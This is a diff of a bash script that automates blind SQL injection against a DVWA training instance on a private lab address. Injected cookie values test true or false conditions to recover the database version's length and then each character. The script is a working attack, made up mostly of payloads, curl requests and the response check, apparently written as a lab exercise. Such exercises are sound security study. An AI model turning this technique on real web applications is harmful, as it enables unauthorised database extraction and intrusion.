@@ -33,16 +33,11 @@ echo "---------------------------------------------------"
 for i in $(seq 1 50); do #Trying length 1-50
   PAYLOAD="1' AND LENGTH(@@version)=$i#" #Payload
 
-  curl -s -X POST \ #Posts the payload
-    -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
-    -d "id=$PAYLOAD&Submit=Submit" \  
-    http://192.168.56.105/DVWA/vulnerabilities/sqli_blind/cookie-input.php > /dev/null
-
-  RESPONSE=$(curl -s \ #Gets the response
+  RESPONSE=$(curl -s \
     -b "PHPSESSID=$PHPSESSID; security=$SECURITY; id=$PAYLOAD" \
     http://192.168.56.105/DVWA/vulnerabilities/sqli_blind/)
 
-  if echo "$RESPONSE" | grep -q "User ID exists in the database."; then #If the response includes "User ID exists in the da>
+  if echo "$RESPONSE" | grep -q "User ID exists in the database."; then #If the response includes "User ID exists in the database.", then it is True
     echo "---------------------------------------------------"
     LENGTH="$i"
     echo "Success! Length found: $LENGTH"
@@ -65,17 +60,12 @@ for ((pos=1; pos<=LENGTH; pos++)); do #For each position in the string
   for ((ascii=32; ascii<=126; ascii++)); do #Trying ASCII 32-126
     PAYLOAD="1' AND ASCII(SUBSTRING(@@version,$pos,1))=$ascii#" #Payload
 
-    curl -s -X POST \ #Posts the payload
-      -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
-      -d "id=$PAYLOAD&Submit=Submit" \  
-      http://192.168.56.105/DVWA/vulnerabilities/sqli_blind/cookie-input.php > /dev/null
-
-    RESPONSE=$(curl -s \ #Gets the response
+    RESPONSE=$(curl -s \
       -b "PHPSESSID=$PHPSESSID; security=$SECURITY; id=$PAYLOAD" \
       http://192.168.56.105/DVWA/vulnerabilities/sqli_blind/)
 
 
-    if echo "$RESPONSE" | grep -q "User ID exists in the database."; then #If the response includes "User ID exists in the >
+    if echo "$RESPONSE" | grep -q "User ID exists in the database."; then #If the response includes "User ID exists in the database.", then it is True
       CHAR=$(printf "\\$(printf '%03o' $ascii)") #Get character from ASCII
       RESULT+="$CHAR" #Adds character to result string
 
